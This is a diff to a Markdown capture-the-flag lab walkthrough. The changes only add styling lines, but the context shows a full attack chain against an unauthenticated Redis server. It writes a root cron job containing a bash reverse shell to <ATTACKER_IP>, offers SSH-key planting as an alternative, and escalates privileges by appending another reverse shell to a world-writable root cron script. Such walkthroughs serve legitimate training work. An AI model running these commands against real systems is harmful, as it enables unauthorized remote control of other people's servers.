@@ -14,12 +14,14 @@ image:
 ```bash
 nmap -sC -sV <TARGET_IP>
 ```
+{: .ms-4 }
 Redis is exposed unauthenticated on 6379.
 
 ## Phase 2 — Confirm Unauthenticated Access
 ```bash
 redis-cli -h <TARGET_IP> ping
 ```
+{: .ms-4 }
 
 ## Phase 3 — RCE via SSH Key / Cron Write
 Use the classic Redis RCE technique — write an SSH key into the vagrant user's `authorized_keys`, or drop a webshell if a web root is reachable. In this lab, the simplest path is writing a cron job directly via Redis's config/dbfilename trick:
@@ -30,6 +32,7 @@ redis-cli -h <TARGET_IP>
 > set x "\n* * * * * root bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'\n"
 > save
 ```
+{: .ms-4 }
 **Note:** Alternatively, write an SSH public key to `/home/vagrant/.ssh/authorized_keys` using the same `dir/dbfilename/set/save` technique.
 
 ## Phase 4 — Shell & User Flag
@@ -38,23 +41,27 @@ nc -lvnp 4444
 # wait for cron / or ssh in with your planted key
 cat /home/vagrant/user.txt
 ```
+{: .ms-4 }
 
 ## Phase 5 — Privilege Escalation (Writable Root Cron Script)
 ```bash
 cat /etc/cron.d/SystemMaintenanceCheck
 ls -la /opt/SystemMaintenanceCheck.sh
 ```
+{: .ms-4 }
 The script is world-writable (666) and executed by root every minute:
 ```bash
 echo 'bash -i >& /dev/tcp/<ATTACKER_IP>/5555 0>&1' >> /opt/SystemMaintenanceCheck.sh
 nc -lvnp 5555
 # wait up to 60s
 ```
+{: .ms-4 }
 
 ## Phase 6 — Root Flag
 ```bash
 cat /root/root.txt
 ```
+{: .ms-4 }
 
 ## Flags
 
